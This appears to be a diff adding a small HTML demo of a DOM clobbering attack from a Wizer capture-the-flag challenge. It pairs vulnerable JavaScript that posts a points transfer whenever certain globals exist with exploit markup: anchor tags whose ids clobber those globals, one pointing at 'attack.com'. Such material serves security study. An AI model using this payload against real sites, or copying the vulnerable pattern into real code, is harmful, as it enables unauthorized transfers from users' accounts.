@@ -1,0 +1,23 @@
+<html>
+    <head>
+    <title>DOM Clobbering Gadget 4: Wizer CTF #14</title>
+    <p>SOURCE:</p>
+    <a href="https://wizer-ctf.com/writeups/ctf14.html">https://wizer-ctf.com/writeups/ctf14.html</a><br/>
+
+    </head>
+    <body>
+    <p>Vulnerable Code:</p>
+    <script>
+if(window.transferBalance && transferTo && pointsToTransfer) {
+  var formData = JSON.stringify({"a": transferTo, "b": pointsToTransfer});
+  const response = $.ajax({type: "POST", url: '../api/transferPoints', async: false,
+    data: formData, success: function(){}, dataType: 'json',
+    contentType : 'application/json'})
+}
+</script>
+    <p>Exploit Code:</p>
+    <a id=transferBalance></a>
+<a id=transferTo></a>
+<a id=pointsToTransfer href="https://attack.com"></a>
+    </body>
+    </html>
